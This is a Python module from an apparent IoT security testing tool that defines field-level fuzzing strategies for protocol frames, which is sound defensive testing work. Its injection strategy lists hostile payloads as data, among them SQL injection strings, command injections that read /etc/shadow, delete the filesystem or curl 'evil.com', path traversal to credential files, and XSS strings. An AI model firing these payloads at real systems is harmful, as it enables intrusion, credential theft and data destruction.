"""
Field-Level Fuzzing Strategies

This module contains fuzzing strategies that manipulate data at the field level.
These strategies work with frame fields and their defined structures to generate
meaningful test cases that target protocol-specific vulnerabilities.

Author: IoT Security Testing Team
Date: 2024
"""

from typing import List, Dict, Any, Optional, Union
import random
import struct
import string
from ..fuzzing_engine import FuzzingStrategy, FuzzingType, FuzzTestCase, MutationResult


class FieldMutationStrategy(FuzzingStrategy):
    """
    Field mutation strategy that modifies field values randomly.
    
    This strategy targets specific fields in the frame data and applies
    various mutation techniques including random value generation,
    existing value modifications, and type-specific mutations.
    """
    
    def __init__(self):
        """Initialize the field mutation strategy."""
        super().__init__("field_mutation", FuzzingType.FIELD_LEVEL)
        self.mutation_types = [
            'random_value',
            'increment',
            'decrement', 
            'bit_flip_in_field',
            'zero_fill',
            'max_fill'
        ]
    
    def can_apply(self, test_case: FuzzTestCase) -> bool:
        """
        Check if field mutation strategy can be applied to the test case.
        
        Args:
            test_case: Test case to check
            
        Returns:
            True if test case has frame fields or field-level fuzzing rules
        """
        if not self.validate_test_case(test_case):
            return False
        
        # Check for frame fields
        if test_case.frame_fields:
            return True
        
        # Check for field-level fuzzing rules
        for rule in test_case.fuzzing_rules:
            rule_type = rule.get('type', '').lower()
            if rule_type in ['field_mutation', 'field_level', 'random_field']:
                return True
        
        return False
    
    def generate_mutations(self, test_case: FuzzTestCase, iterations: int) -> List[MutationResult]:
        """
        Generate field mutation tests for the test case.
        
        Args:
            test_case: Test case to mutate
            iterations: Number of mutations to generate
            
        Returns:
            List of mutation results
        """
        mutations = []
        
        # Get target fields
        target_fields = self._get_target_fields(test_case)
        if not target_fields:
            self.logger.warning(f"No target fields found for test case {test_case.id}")
            return mutations
        
        # Generate mutations
        for iteration in range(iterations):
            try:
                # Randomly select a field to mutate
                field = random.choice(target_fields)
                mutation_type = random.choice(self.mutation_types)
                
                # Apply mutation
                mutated_data, mutation_info = self._apply_field_mutation(
                    test_case.frame_data, field, mutation_type
                )
                
                if mutated_data != test_case.frame_data:
                    mutation_result = MutationResult(
                        original_data=test_case.frame_data,
                        mutated_data=mutated_data,
                        strategy_name=self.name,
                        mutation_info={
                            'operation': 'field_mutation',
                            'field_name': field.get('name', 'unknown'),
                            'field_offset': field.get('offset', 0),
                            'field_size': field.get('size', 0),
                            'mutation_type': mutation_type,
                            **mutation_info
                        },
                        test_case_id=test_case.id,
                        iteration=iteration
                    )
                    
                    mutations.append(mutation_result)
                
            except Exception as e:
                self.logger.error(f"Error generating field mutation {iteration} for test case {test_case.id}: {e}")
                continue
        
        self.logger.info(f"Generated {len(mutations)} field mutations for test case {test_case.id}")
        return mutations
    
    def get_strategy_info(self) -> Dict[str, Any]:
        """Get information about the field mutation strategy."""
        return {
            'name': self.name,
            'type': self.fuzzing_type.value,
            'description': 'Randomly mutates field values using various techniques',
            'parameters': {
                'mutation_types': self.mutation_types
            },
            'requirements': ['frame_fields or field-level fuzzing rules']
        }
    
    def _get_target_fields(self, test_case: FuzzTestCase) -> List[Dict[str, Any]]:
        """Extract target fields from test case."""
        # Use frame fields if available
        if test_case.frame_fields:
            return test_case.frame_fields
        
        # Try to extract from fuzzing rules
        fields = []
        for rule in test_case.fuzzing_rules:
            if rule.get('type', '').lower() in ['field_mutation', 'field_level']:
                target_field = rule.get('target_field', {})
                if target_field:
                    fields.append(target_field)
        
        return fields
    
    def _apply_field_mutation(self, data: bytes, field: Dict[str, Any], 
                             mutation_type: str) -> tuple[bytes, Dict[str, Any]]:
        """Apply a specific mutation to a field."""
        offset = field.get('offset', 0)
        size = field.get('size', 1)
        field_type = field.get('type', 'uint8')
        
        if offset + size > len(data):
            raise ValueError(f"Field extends beyond data bounds: offset={offset}, size={size}, data_len={len(data)}")
        
        # Extract current field value
        field_data = data[offset:offset + size]
        mutated_data = bytearray(data)
        mutation_info = {}
        
        if mutation_type == 'random_value':
            # Generate random value for the field
            new_value = self._generate_random_value(field_type, size)
            mutated_data[offset:offset + size] = new_value
            mutation_info['new_value'] = new_value.hex()
            
        elif mutation_type == 'increment':
            # Increment field value
            current_value = self._bytes_to_int(field_data, field_type)
            new_value = (current_value + 1) % (2 ** (size * 8))
            new_bytes = self._int_to_bytes(new_value, size, field_type)
            mutated_data[offset:offset + size] = new_bytes
            mutation_info['original_value'] = current_value
            mutation_info['new_value'] = new_value
            
        elif mutation_type == 'decrement':
            # Decrement field value
            current_value = self._bytes_to_int(field_data, field_type)
            new_value = (current_value - 1) % (2 ** (size * 8))
            new_bytes = self._int_to_bytes(new_value, size, field_type)
            mutated_data[offset:offset + size] = new_bytes
            mutation_info['original_value'] = current_value
            mutation_info['new_value'] = new_value
            
        elif mutation_type == 'bit_flip_in_field':
            # Flip a random bit within the field
            bit_offset = random.randint(0, size * 8 - 1)
            byte_idx = offset + (bit_offset // 8)
            bit_idx = bit_offset % 8
            mutated_data[byte_idx] ^= (1 << bit_idx)
            mutation_info['flipped_bit'] = bit_offset
            
        elif mutation_type == 'zero_fill':
            # Fill field with zeros
            mutated_data[offset:offset + size] = b'\x00' * size
            mutation_info['fill_value'] = 0
            
        elif mutation_type == 'max_fill':
            # Fill field with maximum value
            mutated_data[offset:offset + size] = b'\xFF' * size
            mutation_info['fill_value'] = 255
        
        return bytes(mutated_data), mutation_info
    
    def _generate_random_value(self, field_type: str, size: int) -> bytes:
        """Generate a random value for the specified field type."""
        if field_type.startswith('uint'):
            # Unsigned integer
            max_value = (2 ** (size * 8)) - 1
            value = random.randint(0, max_value)
            return self._int_to_bytes(value, size, field_type)
        elif field_type.startswith('int'):
            # Signed integer
            max_value = (2 ** (size * 8 - 1)) - 1
            min_value = -(2 ** (size * 8 - 1))
            value = random.randint(min_value, max_value)
            return self._int_to_bytes(value, size, field_type)
        else:
            # Default: random bytes
            return bytes([random.randint(0, 255) for _ in range(size)])
    
    def _bytes_to_int(self, data: bytes, field_type: str) -> int:
        """Convert bytes to integer based on field type."""
        if not data:
            return 0
        
        if field_type.endswith('_le'):
            # Little endian
            endian = 'little'
        else:
            # Big endian (default)
            endian = 'big'
        
        if field_type.startswith('int') and not field_type.startswith('uint'):
            # Signed
            return int.from_bytes(data, byteorder=endian, signed=True)
        else:
            # Unsigned
            return int.from_bytes(data, byteorder=endian, signed=False)
    
    def _int_to_bytes(self, value: int, size: int, field_type: str) -> bytes:
        """Convert integer to bytes based on field type."""
        if field_type.endswith('_le'):
            # Little endian
            endian = 'little'
        else:
            # Big endian (default)
            endian = 'big'
        
        if field_type.startswith('int') and not field_type.startswith('uint'):
            # Signed
            return value.to_bytes(size, byteorder=endian, signed=True)
        else:
            # Unsigned
            return value.to_bytes(size, byteorder=endian, signed=False)


class BoundaryValueStrategy(FuzzingStrategy):
    """
    Boundary value testing strategy that tests edge cases for field values.
    
    This strategy generates test cases using boundary values such as minimum,
    maximum, zero, and values around boundaries for different field types.
    """
    
    def __init__(self):
        """Initialize the boundary value strategy."""
        super().__init__("boundary_value", FuzzingType.FIELD_LEVEL)
        self.boundary_types = [
            'min_value',
            'max_value', 
            'zero',
            'one',
            'min_plus_one',
            'max_minus_one',
            'power_of_two',
            'power_of_two_minus_one'
        ]
    
    def can_apply(self, test_case: FuzzTestCase) -> bool:
        """
        Check if boundary value strategy can be applied to the test case.
        
        Args:
            test_case: Test case to check
            
        Returns:
            True if test case has frame fields or boundary testing rules
        """
        if not self.validate_test_case(test_case):
            return False
        
        # Check for frame fields
        if test_case.frame_fields:
            return True
        
        # Check for boundary testing rules
        for rule in test_case.fuzzing_rules:
            rule_type = rule.get('type', '').lower()
            if rule_type in ['boundary_test', 'boundary_value', 'edge_case']:
                return True
        
        return False
    
    def generate_mutations(self, test_case: FuzzTestCase, iterations: int) -> List[MutationResult]:
        """
        Generate boundary value tests for the test case.
        
        Args:
            test_case: Test case to mutate
            iterations: Number of mutations to generate
            
        Returns:
            List of mutation results
        """
        mutations = []
        
        # Get target fields
        target_fields = self._get_target_fields(test_case)
        if not target_fields:
            self.logger.warning(f"No target fields found for test case {test_case.id}")
            return mutations
        
        iteration_count = 0
        
        # Generate boundary tests for each field
        for field in target_fields:
            if iteration_count >= iterations:
                break
                
            for boundary_type in self.boundary_types:
                if iteration_count >= iterations:
                    break
                
                try:
                    # Apply boundary value
                    mutated_data, mutation_info = self._apply_boundary_value(
                        test_case.frame_data, field, boundary_type
                    )
                    
                    if mutated_data != test_case.frame_data:
                        mutation_result = MutationResult(
                            original_data=test_case.frame_data,
                            mutated_data=mutated_data,
                            strategy_name=self.name,
                            mutation_info={
                                'operation': 'boundary_value_test',
                                'field_name': field.get('name', 'unknown'),
                                'field_offset': field.get('offset', 0),
                                'field_size': field.get('size', 0),
                                'boundary_type': boundary_type,
                                **mutation_info
                            },
                            test_case_id=test_case.id,
                            iteration=iteration_count
                        )
                        
                        mutations.append(mutation_result)
                        iteration_count += 1
                
                except Exception as e:
                    self.logger.error(f"Error generating boundary value {boundary_type} for field {field.get('name')} in test case {test_case.id}: {e}")
                    continue
        
        self.logger.info(f"Generated {len(mutations)} boundary value tests for test case {test_case.id}")
        return mutations
    
    def get_strategy_info(self) -> Dict[str, Any]:
        """Get information about the boundary value strategy."""
        return {
            'name': self.name,
            'type': self.fuzzing_type.value,
            'description': 'Tests boundary values and edge cases for field types',
            'parameters': {
                'boundary_types': self.boundary_types
            },
            'requirements': ['frame_fields or boundary testing rules']
        }
    
    def _get_target_fields(self, test_case: FuzzTestCase) -> List[Dict[str, Any]]:
        """Extract target fields from test case."""
        # Use frame fields if available
        if test_case.frame_fields:
            return test_case.frame_fields
        
        # Try to extract from fuzzing rules
        fields = []
        for rule in test_case.fuzzing_rules:
            if rule.get('type', '').lower() in ['boundary_test', 'boundary_value']:
                target_field = rule.get('target_field', {})
                if target_field:
                    fields.append(target_field)
        
        return fields
    
    def _apply_boundary_value(self, data: bytes, field: Dict[str, Any], 
                             boundary_type: str) -> tuple[bytes, Dict[str, Any]]:
        """Apply a boundary value to a field."""
        offset = field.get('offset', 0)
        size = field.get('size', 1)
        field_type = field.get('type', 'uint8')
        
        if offset + size > len(data):
            raise ValueError(f"Field extends beyond data bounds: offset={offset}, size={size}, data_len={len(data)}")
        
        mutated_data = bytearray(data)
        mutation_info = {}
        
        # Calculate boundary values based on field type and size
        if field_type.startswith('uint'):
            # Unsigned integer
            min_val = 0
            max_val = (2 ** (size * 8)) - 1
        elif field_type.startswith('int'):
            # Signed integer
            min_val = -(2 ** (size * 8 - 1))
            max_val = (2 ** (size * 8 - 1)) - 1
        else:
            # Default to unsigned
            min_val = 0
            max_val = (2 ** (size * 8)) - 1
        
        # Select boundary value
        if boundary_type == 'min_value':
            value = min_val
        elif boundary_type == 'max_value':
            value = max_val
        elif boundary_type == 'zero':
            value = 0
        elif boundary_type == 'one':
            value = 1
        elif boundary_type == 'min_plus_one':
            value = min_val + 1 if min_val + 1 <= max_val else min_val
        elif boundary_type == 'max_minus_one':
            value = max_val - 1 if max_val - 1 >= min_val else max_val
        elif boundary_type == 'power_of_two':
            # Find largest power of 2 that fits in the field
            power = 1
            while power <= max_val:
                if power * 2 > max_val:
                    break
                power *= 2
            value = power
        elif boundary_type == 'power_of_two_minus_one':
            # Power of 2 minus 1 (often problematic values)
            power = 1
            while power <= max_val:
                if power * 2 > max_val:
                    break
                power *= 2
            value = power - 1
        else:
            value = 0
        
        # Ensure value is within bounds
        value = max(min_val, min(max_val, value))
        
        # Convert to bytes and apply
        value_bytes = self._int_to_bytes(value, size, field_type)
        mutated_data[offset:offset + size] = value_bytes
        
        mutation_info['boundary_value'] = value
        mutation_info['min_value'] = min_val
        mutation_info['max_value'] = max_val
        
        return bytes(mutated_data), mutation_info
    
    def _int_to_bytes(self, value: int, size: int, field_type: str) -> bytes:
        """Convert integer to bytes based on field type."""
        if field_type.endswith('_le'):
            # Little endian
            endian = 'little'
        else:
            # Big endian (default)
            endian = 'big'
        
        if field_type.startswith('int') and not field_type.startswith('uint'):
            # Signed
            return value.to_bytes(size, byteorder=endian, signed=True)
        else:
            # Unsigned
            return value.to_bytes(size, byteorder=endian, signed=False)


class InjectionStrategy(FuzzingStrategy):
    """
    Injection testing strategy that injects common attack patterns.
    
    This strategy tests for injection vulnerabilities by injecting various
    attack payloads into string and data fields.
    """
    
    def __init__(self):
        """Initialize the injection strategy."""
        super().__init__("injection", FuzzingType.FIELD_LEVEL)
        self.injection_patterns = {
            'sql_injection': [
                b"' OR '1'='1",
                b"'; DROP TABLE users; --",
                b"1' UNION SELECT NULL--",
                b"admin'--",
                b"' OR 1=1#"
            ],
            'command_injection': [
                b"; cat /etc/passwd",
                b"| whoami",
                b"`cat /etc/shadow`",
                b"$(curl evil.com)",
                b"; rm -rf /"
            ],
            'path_traversal': [
                b"../../../etc/passwd",
                b"..\\..\\..\\windows\\system32\\config\\sam",
                b"....//....//....//etc//passwd",
                b"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            'xss_injection': [
                b"<script>alert('XSS')</script>",
                b"javascript:alert('XSS')",
                b"<img src=x onerror=alert('XSS')>",
                b"';alert('XSS');//"
            ],
            'buffer_overflow': [
                b"A" * 100,
                b"A" * 1000,
                b"A" * 10000,
                b"\x41" * 256,
                b"\x90" * 100 + b"\xcc"  # NOP sled + breakpoint
            ]
        }
    
    def can_apply(self, test_case: FuzzTestCase) -> bool:
        """
        Check if injection strategy can be applied to the test case.
        
        Args:
            test_case: Test case to check
            
        Returns:
            True if test case has string fields or injection testing rules
        """
        if not self.validate_test_case(test_case):
            return False
        
        # Check for frame fields (look for string/text fields)
        if test_case.frame_fields:
            for field in test_case.frame_fields:
                field_type = field.get('type', '').lower()
                if any(t in field_type for t in ['string', 'text', 'ascii', 'utf']):
                    return True
        
        # Check for injection testing rules
        for rule in test_case.fuzzing_rules:
            rule_type = rule.get('type', '').lower()
            if rule_type in ['injection', 'sql_injection', 'command_injection', 'xss', 'buffer_overflow']:
                return True
        
        return False
    
    def generate_mutations(self, test_case: FuzzTestCase, iterations: int) -> List[MutationResult]:
        """
        Generate injection tests for the test case.
        
        Args:
            test_case: Test case to mutate
            iterations: Number of mutations to generate
            
        Returns:
            List of mutation results
        """
        mutations = []
        
        # Get target fields (prefer string fields)
        target_fields = self._get_target_fields(test_case)
        if not target_fields:
            self.logger.warning(f"No target fields found for test case {test_case.id}")
            return mutations
        
        iteration_count = 0
        
        # Generate injection tests
        for field in target_fields:
            if iteration_count >= iterations:
                break
                
            for injection_type, patterns in self.injection_patterns.items():
                if iteration_count >= iterations:
                    break
                
                for pattern in patterns:
                    if iteration_count >= iterations:
                        break
                    
                    try:
                        # Apply injection payload
                        mutated_data, mutation_info = self._apply_injection(
                            test_case.frame_data, field, pattern, injection_type
                        )
                        
                        if mutated_data != test_case.frame_data:
                            mutation_result = MutationResult(
                                original_data=test_case.frame_data,
                                mutated_data=mutated_data,
                                strategy_name=self.name,
                                mutation_info={
                                    'operation': 'injection_test',
                                    'field_name': field.get('name', 'unknown'),
                                    'field_offset': field.get('offset', 0),
                                    'field_size': field.get('size', 0),
                                    'injection_type': injection_type,
                                    'payload': pattern.decode('utf-8', errors='replace'),
                                    **mutation_info
                                },
                                test_case_id=test_case.id,
                                iteration=iteration_count
                            )
                            
                            mutations.append(mutation_result)
                            iteration_count += 1
                    
                    except Exception as e:
                        self.logger.error(f"Error generating injection test for field {field.get('name')} in test case {test_case.id}: {e}")
                        continue
        
        self.logger.info(f"Generated {len(mutations)} injection tests for test case {test_case.id}")
        return mutations
    
    def get_strategy_info(self) -> Dict[str, Any]:
        """Get information about the injection strategy."""
        return {
            'name': self.name,
            'type': self.fuzzing_type.value,
            'description': 'Tests for injection vulnerabilities using common attack patterns',
            'parameters': {
                'injection_types': list(self.injection_patterns.keys()),
                'total_patterns': sum(len(patterns) for patterns in self.injection_patterns.values())
            },
            'requirements': ['string/text fields or injection testing rules']
        }
    
    def _get_target_fields(self, test_case: FuzzTestCase) -> List[Dict[str, Any]]:
        """Extract target fields from test case, preferring string fields."""
        fields = []
        
        # Use frame fields if available (prefer string fields)
        if test_case.frame_fields:
            for field in test_case.frame_fields:
                field_type = field.get('type', '').lower()
                # Prioritize string/text fields
                if any(t in field_type for t in ['string', 'text', 'ascii', 'utf']):
                    fields.append(field)
            
            # If no string fields, use all fields
            if not fields:
                fields = test_case.frame_fields
        
        # Try to extract from fuzzing rules
        for rule in test_case.fuzzing_rules:
            if rule.get('type', '').lower() in ['injection', 'sql_injection', 'command_injection']:
                target_field = rule.get('target_field', {})
                if target_field:
                    fields.append(target_field)
        
        return fields
    
    def _apply_injection(self, data: bytes, field: Dict[str, Any], 
                        payload: bytes, injection_type: str) -> tuple[bytes, Dict[str, Any]]:
        """Apply an injection payload to a field."""
        offset = field.get('offset', 0)
        size = field.get('size', 1)
        
        if offset + size > len(data):
            raise ValueError(f"Field extends beyond data bounds: offset={offset}, size={size}, data_len={len(data)}")
        
        mutated_data = bytearray(data)
        mutation_info = {}
        
        # Truncate or pad payload to fit field size
        if len(payload) > size:
            # Truncate payload
            injected_payload = payload[:size]
            mutation_info['payload_truncated'] = True
        else:
            # Pad payload with null bytes
            injected_payload = payload + b'\x00' * (size - len(payload))
            mutation_info['payload_padded'] = True
        
        # Apply payload
        mutated_data[offset:offset + size] = injected_payload
        
        mutation_info['payload_length'] = len(payload)
        mutation_info['field_size'] = size
        mutation_info['injection_category'] = injection_type
        
        return bytes(mutated_data), mutation_info 